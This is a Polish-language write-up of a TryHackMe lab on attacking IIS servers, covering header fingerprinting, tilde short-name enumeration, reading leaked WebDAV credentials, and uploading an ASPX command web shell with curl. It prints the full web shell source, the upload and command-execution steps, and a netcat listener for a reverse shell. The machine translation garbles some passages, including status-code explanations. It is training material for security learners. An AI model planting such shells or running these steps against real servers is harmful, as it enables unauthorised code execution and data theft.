---

Link do wyzwania TryHackMe: [**Ataki na serwery WWW – II**](https://tryhackme.com/room/webserverattacks2)

## Wstęp

Usługa IIS jest zainstalowana na praktycznie każdym serwerze Windows Server z aplikacją internetową, portalem intranetowym lub interfejsem API REST. W przeciwieństwie do samodzielnych serwerów internetowych, usługa IIS jest ściśle zintegrowana z uwierzytelnianiem systemu Windows, usługą Active Directory i środowiskiem wykonawczym .NET, co czyni ją wartościowym celem dostępu początkowego.

Grupa Lazarus wykorzystała serwery IIS w 2023 roku do uzyskania wstępnego dostępu i dystrybucji złośliwego oprogramowania ( [AhnLab ASEC, 2023 (otwiera się w nowej karcie)](https://asec.ahnlab.com/en/53132/) ). HAFNIUM wdrożył powłoki internetowe ASPX na serwerze IIS podczas kampanii [Exchange ProxyLogon (otwiera się w nowej karcie)](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) w 2021 roku. [Doradztwo CISA AA23-074A (otwiera się w nowej karcie)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a) udokumentowało, że wielu aktorów zagrożeń, w tym grupa APT, wykorzystało lukę w zabezpieczeniach deserializacji .NET (CVE-2019-18935) w komponentach interfejsu użytkownika Progress Telerik hostowanych na serwerach IIS rządu USA. Aktorzy uzyskali zdalne wykonanie kodu  `w3wp.exe`i umieścili złośliwe biblioteki DLL, aby zapewnić sobie trwałość. Błędy w konfiguracji serwera IIS i niezałatane luki CVE pozostają aktywnymi powierzchniami ataku we wszystkich tych incydentach.

Ta sala jest kontynuacją naszej poprzedniej sali [„Ataki na serwery WWW”](https://tryhackme.com/jr/webserverattacks) , w której omówiliśmy różne serwery możliwe do wdrożenia na hoście Ubuntu. W tej sali przechodzimy przez łańcuch ataku na serwer IIS od początku do końca: odcisk palca serwera, enumeracja ukrytych plików za pomocą dziwactwa systemu Windows, przesyłanie powłoki przez błędnie skonfigurowany katalog WebDAV oraz identyfikacja typowych błędów w konfiguracji serwera, które nie wymagają kodu exploita.

## **Cele edukacyjne**

- Odcisk palca serwera IIS w celu ustalenia jego wersji i włączonych funkcji
    
- Użyj wyliczenia tyldy w IIS, aby odkryć ukryte pliki i katalogi
    
- Wykorzystaj błędnie skonfigurowaną instalację WebDAV do przesłania i wykonania powłoki poleceń ASPX
    
- Zrozum, jak działają powłoki internetowe ASPX i jaki dostęp zapewniają
    
- Poznaj techniki automatyzacji umożliwiające tworzenie odcisków palców i enumerację serwera IIS

## **Wymagania wstępne**

- Jak działają żądania i odpowiedzi HTTP, w tym nagłówki, metody i kody statusu ( sala [„HTTP in Detail ”)](https://tryhackme.com/room/httpindetail)
    
- Wygodne uruchamianie narzędzi z terminala Kali lub AttackBox ( sala [Linux Shells](https://tryhackme.com/room/linuxshells) )
    
- Zrozumienie adresów IP, portów i połączeń TCP ( sala [Podstawy sieci](https://tryhackme.com/room/networkingessentials) )

## Odcisk palca i wyliczanie IIS

Zanim atakujący zaatakują exploita lub powłokę, poświęcają czas na zrozumienie celu. W przypadku IIS ma to większe znaczenie niż w przypadku większości serwerów WWW. Wersja IIS informuje, które luki CVE mają zastosowanie. Obecność WebDAV sugeruje, że może istnieć bezpośrednia ścieżka przesyłania plików. Metody HTTP akceptowane przez serwer informują o możliwych operacjach. Wszystko to odbywa się poprzez odczyt nagłówków i uruchomienie kilku podstawowych narzędzi, a większość z nich pozostawia minimalne ślady w logach serwera.

## **Co mówią numery wersji IIS**

Numery wersji IIS są bezpośrednio powiązane z wersjami systemu Windows Server. Ma to znaczenie, ponieważ wiele luk CVE jest specyficznych dla danej wersji, a wiele organizacji korzysta z IIS na serwerach, które nie otrzymują już aktualizacji zabezpieczeń.

|**Wersja IIS**|**Serwer Windows**|**Status**|
|---|---|---|
|IIS 6.0|Serwer 2003|Koniec wsparcia (lipiec 2015). Brak poprawek po zakończeniu wsparcia.|
|IIS 7.0 / 7.5|Serwer 2008 / 2008 R2|Koniec życia|
|IIS 8.0 / 8.5|Serwer 2012 / 2012 R2|Koniec życia|
|IIS 10.0|Serwer 2016, 2019, 2022|Aktualny|

Uwaga: IIS pominął wersję 9.x. Numeracja wzrosła bezpośrednio z 8.5 do 10.0 po premierze systemu Windows Server 2016. Docelowy serwer laboratoryjny uruchamia IIS 10.0 w systemie Windows Server 2019.

Jeśli widzisz `IIS/6.0`błąd w nagłówku serwera na publicznym adresie IP, traktuj go jako zagrożony, dopóki nie zostanie udowodnione inaczej. Nie ma oficjalnej poprawki Microsoft dla luki CVE-2017-7269, która dotyczy konkretnie IIS 6.0. Omówimy tę lukę CVE w zadaniu 7.

## **Architektura IIS (elementy istotne w przypadku ataków)**

Zrozumienie przepływu żądań pomaga ustalić, gdzie znajdują się luki w zabezpieczeniach i dlaczego niektóre ataki działają. Żądanie docierające do serwera IIS przechodzi przez kilka warstw:

![Przepływ żądań IIS: HTTP.sys na poziomie jądra, następnie W3SVC, WAS, proces roboczy w3wp.exe i kod aplikacji.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778090380771.png)

**HTTP.sys** to sterownik trybu jądra, który odbiera cały ruch HTTP, zanim dotrze do niego jakikolwiek proces IIS. Luka w zabezpieczeniach, taka jak CVE-2022-21907, działa w kontekście jądra. Awaria na tym poziomie to niebieski ekran śmierci, a nie łagodny błąd serwera WWW.

**Pule aplikacji** to kontenery izolacyjne. Każda pula uruchamia własny `w3wp.exe`proces pod własną tożsamością systemu Windows. Jest to kontekst konta, w którym działa powłoka internetowa ASPX. W IIS 7.5 i nowszych domyślną tożsamością jest `ApplicationPoolIdentity`, konto wirtualne o nazwie `IIS APPPOOL\<pool name>`. Zarówno `ApplicationPoolIdentity`, jak i starsza wersja , domyślnie `NETWORK SERVICE`noszą identyfikatory `SeImpersonatePrivilege`, co otwiera drogę do ataków eskalacji w stylu Potato. Wrócimy do tego w zadaniu 5.

## **Przechwytywanie banerów HTTP**

Najszybszym sposobem na identyfikację produktu IIS jest odczytanie nagłówków odpowiedzi. IIS dołącza `Server`do każdej odpowiedzi nagłówek identyfikujący produkt i wersję:

Terminal AttackBox

```shell-session
root@ip-10-82-74-10:~# curl -I http://MACHINE_IP
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Mon, 13 Apr 2026 14:05:52 GMT
Accept-Ranges: bytes
ETag: "d5e75da34ecbdc1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 25 Apr 2026 09:02:04 GMT
```

Nagłówek `Server`podaje wersję IIS. `X-Powered-By:` [`ASP.NET`](http://asp.net/)Potwierdza hosting aplikacji .NET. `X-AspNet-Version`Podaje wersję środowiska .NET Framework, która może ujawnić dodatkowe luki CVE.

## **Wykrywanie WebDAV z OPCJAMI**

Web Distributed Authoring and Versioning (WebDAV) to rozszerzenie HTTP, które dodaje następujące czasowniki do zarządzania plikami: `PUT`(przesyłanie), `DELETE`, `COPY`, `MOVE`, `PROPFIND`i `LOCK`. Prawidłowe zastosowania obejmują SharePoint i internetowe narzędzia do edycji plików. Po pozostawieniu włączonego w katalogu z uprawnieniami do zapisu i wykonywania skryptów, staje się ono bezpośrednią ścieżką do przesłania pliku wykonywalnego powłoki.

Metoda HTTP `OPTIONS`prosi serwer o zwrócenie obsługiwanych metod. Pojedyncze polecenie informuje, czy WebDAV jest aktywny:

```bash
curl -X OPTIONS http://MACHINE_IP -sv 2>&1 | grep -E "Allow:|DAV:"
```

Jeżeli włączony jest protokół WebDAV, odpowiedź zawiera `DAV:`nagłówek i rozszerzoną `Allow:`listę:

Terminal AttackBox

```shell-session
root@ip-10-82-74-10:~# curl -X OPTIONS http://MACHINE_IP/webdav -sv 2>&1 | grep -E "Allow:|DAV:"
Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
DAV: 1,2,3
```

Lista `Allow:`zawierająca tylko `GET`, `HEAD`, `POST`i `OPTIONS`oznacza, że ​​WebDAV jest wyłączony. Jeśli widzisz `PUT`, `MOVE`, i `DAV: 1,2`, WebDAV jest włączony i należy go przetestować pod kątem dostępu do zapisu.

## **Testowanie, jakie typy plików można przesyłać i wykonywać**

Sama wiedza o tym, że WebDAV jest włączony, nie wystarczy. Musisz wiedzieć, czy możesz przesyłać pliki i, co najważniejsze, czy przesłane pliki są wykonywane. Podejście jest proste: `PUT`plik testowy, następnie `GET`go i obserwuj reakcję. Wartość „A” `200`z wynikiem oznacza, że ​​serwer go wykonał; wartość „200” z surową zawartością pliku oznacza, że ​​został on obsłużony statycznie.

Przetestuj wykonanie ASPX `curl`bezpośrednio, bez konieczności posiadania poświadczeń:

Terminal

```shell-session
root@ip-10-81-64-63:~# curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://MACHINE_IP/webdav/test.aspx
PUT aspx: 401
```

A `401 Created`na `PUT`potwierdza brak dostępu do zapisu. A  `401`na `GET`zrenderowanym wyjściu (nie surowym źródle) potwierdza wykonanie.

## **Normalne i podejrzane wzorce ruchu**

Praca nad projektem oznacza odczytywanie wzorców ruchu. Oto, na co należy zwrócić uwagę podczas przeglądania logów dostępu do IIS lub przechwytywania ruchu w celu identyfikacji nadużyć WebDAV:

|**Wzór**|**Normalna**|**Podejrzany**|
|---|---|---|
|Metody HTTP|`GET`, `POST`,`HEAD`|`OPTIONS`zwracanie `DAV:`nagłówka; `PUT`, `MOVE`,`PROPFIND`|
|Ścieżki URI|`.htm`, `.aspx`, `.js`, `.css`, zasoby statyczne|Ścieżki zawierające `~`; nowo pojawiające się `.aspx`pliki w katalogach zapisywalnych|
|Kody statusu|200, 304, 301, 302, 404|201 Utworzono (plik przesłany za pomocą polecenia PUT); nieoczekiwany komunikat PUT lub DELETE w logach|
|`Server`chodnikowiec|Obecna, odpowiada oczekiwanej wersji|Wyciszono lub ujawniono wersję EOL, np.`IIS/6.0`|

**Śledź ćwiczenia laboratoryjne, wykonując te kroki. Na** komputerze, który uruchomiłeś w Zadaniu 1, działa IIS z włączonym WebDAV w `/webdav/`katalogu.

### Odpowiedz na poniższe pytania

Który nagłówek odpowiedzi HTTP ujawnia wersję serwera IIS?`Server`

```shell
curl -I http://IP_Address
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Mon, 13 Apr 2026 14:05:52 GMT
Accept-Ranges: bytes
ETag: "d5e75da34ecbdc1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Fri, 22 May 2026 17:50:51 GMT
```

```shell
curl -X OPTIONS http://IP_Address -sv 2>&1 | grep -E "Allow:|DAV:"
< Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
< DAV: 1,2,3
```

Jaki jest kod odpowiedzi HTTP po wykonaniu żądania PUT w `/webdav`katalogu?`401`

```shell
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://IP_Address/webdav/test.aspx
PUT aspx: 401
```

## Wyliczenie tyldy (krótkiej nazwy pliku) w IIS

Jedna z najskuteczniejszych technik rozpoznania serwera IIS nie wymaga żadnego exploita. Wykorzystuje ona pewien dziwaczny mechanizm wbudowany w system Windows. Technika enumeracji tyldy w IIS ujawnia nazwy plików i katalogów, których standardowe przeglądanie i atak brute-force nigdy nie wykryłyby. Jeśli na serwerze znajduje się plik kopii zapasowej lub ukryty katalog administracyjny, ta technika go ujawni.

### 8.3 Problem krótkich nazw plików

System Windows odziedziczył format nazw plików 8.3 z DOS-a. W tym formacie nazwa pliku może mieć maksymalnie 8 znaków (nazwa) i 3 znaki (rozszerzenie). System Windows generuje krótkie nazwy plików 8.3 oraz długie nazwy plików dla każdego pliku utworzonego na woluminach NTFS. Jest to ustawienie domyślne w większości instalacji systemu Windows Server, chociaż nowsze kompilacje serwerów i obrazy w chmurze czasami je wyłączają. W docelowym środowisku laboratoryjnym tworzenie nazw 8.3 jest włączone.

Zasada konwersji jest przewidywalna:

- Weź pierwsze 6 znaków długiej nazwy
    
- Dołącz `~1`(lub `~2`, `~3`jeśli występuje kolizja)
    
- Zachowaj pierwsze 3 znaki rozszerzenia

Więc `BackupFiles`staje się `BACKUP~1`. `AdminPortal`staje się `ADMINI~1`. `users_backup.xlsx`staje się `USERS_~1.XLS`.

![Diagram przedstawiający konwersję długiej nazwy pliku BackupFiles do krótkiej nazwy 8.3 BACKUP~1 i wykrycie jej za pomocą żądania HTTP z tyldą.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778160181096.png)

**Jak działa luka w zabezpieczeniach**

Gdy IIS otrzymuje żądanie zawierające `~`znak w ścieżce, przetwarza je w odniesieniu do przestrzeni nazw skróconych 8.3. Kluczowym zachowaniem jest to, że IIS reaguje inaczej w zależności od tego, czy ścieżka tylda pasuje do rzeczywistej krótkiej nazwy, czy nie. Ścieżka, która pasuje do rzeczywistego pliku lub katalogu, zwraca inny kod stanu HTTP lub rozmiar odpowiedzi niż ścieżka, która nic nie pasuje.

Ta różnica jest niewielka, ale zauważalna. Skaner wykorzystuje ją do rekonstrukcji pełnych, krótkich nazw znak po znaku, a z krótkiej nazwy często można wywnioskować, jaka jest pełna nazwa zasobu.

Na przykład, jeśli skaner stwierdzi, że `/BACKUP~1/`zwracany jest element `404`o nieco innym ciele odpowiedzi niż `/ZZZZZZ~1/`, wie o jego `BACKUP~1`istnieniu. Atakujący wie teraz, że istnieje katalog, którego nazwa zaczyna się od `BACKUP`, i może spróbować uzyskać do niego bezpośredni dostęp lub wyliczyć go dalej.

Ta technika ujawnia ukryte katalogi i pliki kopii zapasowych, które standardowa metoda bruteforce na liście słów całkowicie by pominęła. Długa nazwa pliku może być całkowicie nieodgadniona, podczas gdy krótka nazwa jest zawsze przewidywalna na podstawie pierwszych 6 znaków.

**Dotknięte wersje** : Ta luka w zabezpieczeniach jest znana od momentu jej publicznego ujawnienia w 2012 roku (odkrycia w 2010 roku) i dotyczy IIS od wersji 5.x do IIS 10.0, w tym obecnych wersji na serwerze Server 2022. Firma Microsoft odmówiła jej załatania. Zalecanym sposobem zaradzenia temu problemowi jest wyłączenie tworzenia nazw plików 8.3 w rejestrze systemu Windows.

### Skanowanie za pomocą pliku iis_shortname_scan.py

Skaner używany w tym pomieszczeniu to `iis_shortname_scan.py`narzędzie w Pythonie, które skanuje serwer znak po znaku i rekonstruuje krótkie nazwy na podstawie różnic w odpowiedziach. Nie wymaga środowiska uruchomieniowego Java; działa bezpośrednio na AttackBoxie.

W polu Attack przejdź do `/opt/IIS_shortname_Scanner`polecenia `cd /opt/IIS_shortname_Scanner`i uruchom następujące skanowanie:

```shell
root@tryhackme:~/IIS_shortname_Scanner# python3 iis_shortname_scan.py http://MACHINE_IP/
Server is vulnerable, please wait, scanning...
[+] /a~1.*    [scan in progress]
[+] /b~1.*    [scan in progress]
[+] /as~1.*    [scan in progress]
[+] /ba~1.*    [scan in progress]
[+] /asp~1.*    [scan in progress]
[+] /bac~1.*    [scan in progress]
[+] /aspn~1.*    [scan in progress]
[+] /back~1.*    [scan in progress]
[+] /aspne~1.*    [scan in progress]
[+] /backu~1.*    [scan in progress]
[+] /aspnet~1.*    [scan in progress]
[+] /backup~1.*    [scan in progress]
[+] /aspnet~1    [scan in progress]
[+] Directory /aspnet~1    [Done]
[+] /backup~1    [scan in progress]
[+] Directory /backup~1    [Done]
----------------------------------------------------------------
Dir:  /aspnet~1
Dir:  /backup~1
----------------------------------------------------------------
2 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

Narzędzie działa od lewej do prawej: najpierw potwierdza prefiksy jednoznakowe ( `/a~1.*`, `/b~1.*`), a następnie rozszerza każde dopasowanie litera po literze, aż do uzyskania pełnej, krótkiej nazwy. Zaznaczone wiersze `[scan in progress]`to sondy na żywo; każdy z nich to osobne żądanie HTTP, które sprawdza, czy istnieje ścieżka rozpoczynająca się od tych znaków. Gdy sekwencja znaków przestaje pasować, gałąź jest pomijana. Gdy zostanie rozwiązana do pełnej nazwy bez symbolu wieloznacznego, wpis jest oznaczany  `[Done]`.

Podsumowanie na dole zawiera potwierdzone krótkie nazwy. `Dir:`Wpis to katalog, `File:`który zawiera rozszerzenie. Znaleziono dwa katalogi: `/aspnet~1`( katalog plików tymczasowych [ASP.NET](http://asp.net/)`/backup~1` ) i (katalog kopii zapasowej, który Cię interesuje).

## **Co mówi Ci krótka nazwa**

Format 8.3 ujawnia pierwsze 6 znaków nazwy pliku i pierwsze 3 znaki rozszerzenia. W większości przypadków wystarcza to do zidentyfikowania typu zasobu:

|**Odkryto krótką nazwę**|**Prawdopodobne pełne imię i nazwisko**|**Dlaczego to ma znaczenie**|
|---|---|---|
|`BACKUP~1/`|`BackupFiles/`,`Backup_2024/`|Kopia zapasowa danych, prawdopodobnie poufna|
|`ADMINI~1/`|`AdminInterface/`,`Administration/`|Panel administracyjny, ograniczony dostęp|
|`CONFIG~1.ASP`|`configuration.asp`,`config_old.asp`|Plik konfiguracyjny może zawierać dane uwierzytelniające|
|`USERS_~1.XLS`|`users_backup.xlsx`|Eksport danych użytkownika, cel o wysokiej wartości|

Sama nazwa częściowa to rekonesans. Rzeczywista zawartość odkrytego zasobu to cel ataku.

## **Wyliczanie odkrytego katalogu**

Krótka nazwa `backup~1`informuje, że nazwa katalogu zaczyna się od  `backup`. IIS nie udostępnia zawartości bezpośrednio za pośrednictwem ścieżki URL krótkiej nazwy; skaner wykorzystuje różnice w odpowiedziach, a nie bezpośrednie rozwiązanie problemu.

```shell
root@tryhackme:~# curl http://MACHINE_IP/BackupFiles/
<html><head><title>MACHINE_IP - /BackupFiles/</title></head><body><H1>MACHINE_IP - /BackupFiles/</H1><hr>
<pre><A HREF="/">[To Parent Directory]</A><br><br>
 4/25/2026  11:04 AM               91 <A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A><br></pre><hr></body></html>
```

Włączono listę katalogów, która pokazuje jeden plik: `webdav_notes.txt`. W prawdziwym starciu wypróbuj kilka uzupełnień ( `/backup/`, `/BackupFiles/`, `/backup_data/`) lub użyj listy słów dla potwierdzonego 6-znakowego prefiksu. Pobierz plik:

```shell
root@tryhackme:~# curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
WebDAV setup notes
Directory: /webdav/
Username: [Username]
Password: [Password]
```

### Odpowiedz na poniższe pytania

Który znak w ścieżce URL powoduje wystąpienie różnicy w odpowiedzi wyliczenia tyldy w usłudze IIS?`~`

Jaki starszy format nazw plików systemu Windows wykorzystuje lukę w zabezpieczeniach związaną z wyliczeniem tyldy? (Format odpowiedzi: XX)`8.3`

Jakie hasło jest zapisane w pliku odkrytym za pomocą wyliczenia tyldą?`P@ssw0rd!123`

```shell
gobuster dir -u http://IP_Address -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -x php

/uploads              (Status: 301) [Size: 153] [--> http://10.113.161.241/uploads/]
/*checkout*           (Status: 400) [Size: 3490]
/Uploads              (Status: 301) [Size: 153] [--> http://10.113.161.241/Uploads/]
/*docroot*            (Status: 400) [Size: 3490]
/*                    (Status: 400) [Size: 3490]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3490]
/q%26a                (Status: 400) [Size: 3490]
/http%3A              (Status: 400) [Size: 3490]
/**http%3a            (Status: 400) [Size: 3490]
/webdav               (Status: 301) [Size: 152] [--> http://10.113.161.241/webdav/]
/*http%3A             (Status: 400) [Size: 3490]
/**http%3A            (Status: 400) [Size: 3490]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3490]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3490]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3490]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3490]
```

```shell
curl http://10.113.190.54/BackupFiles/webdav_notes.txt
WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```

## Wykorzystanie WebDAV: przesyłanie powłoki ASPX

W zadaniu 2, wysłanie nieuwierzytelnionego `PUT`żądania do `/webdav/`zwróconego serwera `401 Unauthorized`IIS WebDAV na serwerze 2019 wymaga poświadczeń. W zadaniu 3, wyświetlona została tylda `BackupFiles/webdav_notes.txt`, która zawierała dokładnie te poświadczenia: `webdav_user:P@ssw0rd!123`. Teraz wykorzystujemy je do wykorzystania WebDAV.

Gdy katalog WebDAV ma uprawnienia do zapisu i włączone wykonywanie skryptów, przesłanie pliku ASPX i zażądanie go spowoduje wykonanie kodu, bez konieczności stosowania exploita.

### Trzy warunki pomyślnego przesłania powłoki

Trzy rzeczy muszą być prawdziwe jednocześnie:

- **WebDAV jest włączony** w katalogu docelowym
    
- **Prawidłowe dane uwierzytelniające** z **uprawnieniem zapisu** w katalogu WebDAV
    
- **Jeśli ustawiono opcję Script Execute** , usługi IIS przekazują `.aspx`żądania do programu obsługi ASP.NET zamiast udostępniać je jako zawartość statyczną

Jeśli czegoś brakuje, atak kończy się niepowodzeniem na tym etapie.

### Przygotowywanie powłoki ASPX

Zapisz poniższy kod `cmd.aspx`w swoim AttackBoxie. Akceptuje on `cmd`parametr zapytania, uruchamia go `cmd.exe`i zwraca wynik:

```plaintext
<​%@ Page Language="C#" %​>
<​% 
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%​>
```

### Wgrywanie powłoki

IIS chroni `/webdav/`katalog za pomocą uwierzytelniania systemu Windows. Użytkownicy anonimowi mogą tylko odczytywać ( `GET`), ale operacje zapisu ( `PUT`, `DELETE`, `MOVE`) wymagają prawidłowej tożsamości systemu Windows. **Protokół NTLM** potwierdza tę tożsamość bez przesyłania hasła w postaci zwykłego tekstu. Flaga `--ntlm`w programie curl nakazuje użycie protokołu uzgadniania do uwierzytelniania.

Użyj `curl`uwierzytelniania NTLM do `PUT`pliku bezpośrednio do katalogu WebDAV. W polu AttackBox wprowadź następujące polecenie:

```shell
root@ip-10-81-64-63:~# curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
*   Trying 10.82.111.103:80...
* TCP_NODELAY set
* Connected to MACHINE_IP (10.82.111.103) port 80 (#0)
* Server auth using NTLM with user 'webdav_user'
> PUT /webdav/cmd1.aspx HTTP/1.1
> Host: MACHINE_IP
> Authorization: NTLM TlRMTVNTUAABAAAABoIIAAAAAAAAAAAAAAAAAAAAAAA=
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 0
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html; charset=us-ascii
< Server: Microsoft-HTTPAPI/2.0
< WWW-Authenticate: NTLM TlRMTVNTUAACAAAADwAPADgAAAAGgooCUr19HvNweE8AAAAAAAAAAKQApABHAAAACgBjRQAAAA9DSEFOR0UtTVktSE9TVE4CAB4AQwBIAEEATgBHAEUALQBNAFkALQBIAE8AUwBUAE4AAQAeAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAAQAJABDAEgAQQBOAEcARQAtAE0AWQAtAEgATwBTAFQATgBBAE0ARQADACQAQwBIAEEATgBHAEUALQBNAFkALQBIAE8AUwBUAE4AQQBNAEUABwAIAOe3aDm71NwBAAAAAA==
< Date: Sat, 25 Apr 2026 13:55:50 GMT
< Content-Length: 341
< 
* Ignoring the response-body
* Connection #0 to host MACHINE_IP left intact
* Issue another request to this URL: 'http://MACHINE_IP/webdav/cmd1.aspx'
* Found bundle for host MACHINE_IP: 0x561346141070 [serially]
* Can not multiplex, even if we wanted to!
* Re-using existing connection! (#0) with host MACHINE_IP
* Connected to MACHINE_IP (10.82.111.103) port 80 (#0)
* Server auth using NTLM with user 'webdav_user'
> PUT /webdav/cmd1.aspx HTTP/1.1
> Host: MACHINE_IP
> Authorization: NTLM TlRMTVNTUAADAAAAGAAYAEAAAADUANQAWAAAAAAAAAAsAQAACwALACwBAAAOAA4ANwEAAAAAAAAAAAAABoKKAhuOfD612m7mouqEmLimX8M8+sTBhmllV/pPadk7qq29fPVauA7TodgBAQAAAAAAAAAYST+71NwBPPrEwYZpZVcAAAAAAgAeAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAAEAHgBDAEgAQQBOAEcARQAtAE0AWQAtAEgATwBTAFQATgAEACQAQwBIAEEATgBHAEUALQBNAFkALQBIAE8AUwBUAE4AQQBNAEUAAwAkAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAEEATQBFAAcACADnt2g5u9TcAQAAAAAAAAAAd2ViZGF2X3VzZXJpcC0xMC04MS02NC02Mw==
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 436
> Expect: 100-continue
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< Server: Microsoft-IIS/10.0
< Persistent-Auth: true
< X-Powered-By: ASP.NET
< Date: Sat, 25 Apr 2026 13:55:50 GMT
< Content-Length: 0
< 
* Connection #0 to host MACHINE_IP left intact
```

201 Utworzono potwierdza, że ​​plik został zapisany na serwerze.

### Potwierdzenie wykonania

Poproś o powłokę za pomocą polecenia testowego:

```plaintext
root@ip-10-82-74-10:~# curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
<pre>iis apppool\defaultapppool
</pre>
```

Powłoka jest wykonywana pod tożsamością procesu roboczego IIS. Jeśli otrzymasz pustą odpowiedź lub błąd 500, uprawnienie „Wykonywanie skryptu” nie jest ustawione dla `/webdav/`przesłanego pliku, ale IIS nie przekaże żądań .aspx do `ASP.NET`modułu obsługi.

### Odpowiedz na poniższe pytania

Jaki kod statusu HTTP potwierdza, że ​​plik został pomyślnie utworzony za pomocą PUT?`201`

Jaka flaga curl jest wymagana do uwierzytelnienia NTLM podczas przesyłania danych przez WebDAV?`--ntlm`

## Powłoki internetowe ASPX

Powłoka została przesłana. Następnym krokiem jest interakcja z nią i zrozumienie, co posiadasz. To zadanie obejmuje omówienie, czym są powłoki internetowe ASPX, jak działają w procesie IIS, jak wyglądają rzeczywiste powłoki oraz jak przejść z wykonywania poleceń w przeglądarce do interaktywnej powłoki odwrotnej.

## **Czym jest powłoka internetowa ASPX**

Powłoka internetowa ASPX to plik [ASP.NET](http://asp.net/) hostowany na serwerze WWW, który akceptuje dane wejściowe atakującego za pośrednictwem protokołu HTTP i wykonuje je w ramach procesu serwera. Z perspektywy serwera jest to po prostu kolejna `.aspx`strona. Z perspektywy atakującego jest to zdalny interfejs poleceń.

Gdy IIS otrzyma żądanie `cmd.aspx`, przekazuje plik do procedury obsługi [ASP.NET](http://asp.net/) . Procedura obsługi kompiluje i wykonuje kod wewnątrz `w3wp.exe`procesu roboczego IIS. Kod jest uruchamiany pod tożsamością puli aplikacji, czyli kontem systemu Windows, z którego korzysta pula aplikacji.

Ma to znaczenie, ponieważ tożsamość puli aplikacji określa, co może zrobić powłoka. Pula aplikacji działająca jako `ApplicationPoolIdentity`(domyślnie w IIS 7.5+) ma ograniczony dostęp do systemu, ale dziedziczy `SeImpersonatePrivilege`. Pula aplikacji działająca jako administrator domeny lub `SYSTEM`natychmiast przyznałaby powłoce wysokie uprawnienia.

## **Krok 1: Wykonywanie poleceń za pośrednictwem powłoki**

Za pomocą `cmd.aspx`uploaded to `/webdav/`możesz uruchamiać polecenia, przekazując je jako `cmd`parametr zapytania. Przejdź do poniższego adresu URL w przeglądarce lub użyj `curl`, a treść odpowiedzi będzie zawierała wynik polecenia wyrenderowany w `<pre>`bloku:

Terminal AttackBox

```shell-session
root@ip-10-82-74-10:~# curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
<pre>iis apppool\defaultapppool
</pre>
```

To mówi Ci dwie rzeczy. Po pierwsze, powłoka jest wykonywana. Po drugie, konto uruchamiające powłokę to `iis apppool\defaultapppool`, czyli domyślna tożsamość puli aplikacji IIS w nowoczesnych instalacjach IIS.

Aby się zorientować, wypróbuj jeszcze kilka poleceń:

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=hostname"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=ipconfig"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=dir+C:\\"
```

![](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** spacje w kodzie URL należy zakodować jako `+`lub `%20`w `cmd`parametrze. Dane wyjściowe polecenia zawierające znaki specjalne mogą być wyświetlane inaczej w zależności od kodowania, ale polecenia bazowe nadal działają poprawnie.

## **Krok 2: Eskalacja do powłoki odwrotnej**

Powłoka poleceń w przeglądarce jest przydatna, ale ograniczona. Aby uzyskać dostęp interaktywny, potrzebna jest pełna sesja powłoki odwrotnej. Najczystszym rozwiązaniem jest wywołanie jednolinijkowego polecenia programu PowerShell z powłoki ASPX, które łączy się z programem nasłuchującym Netcat w urządzeniu AttackBox.

Najpierw uruchom Netcata na swoim AttackBoxie, nasłuchując na porcie 443:

```bash
nc -lvnp 443
```

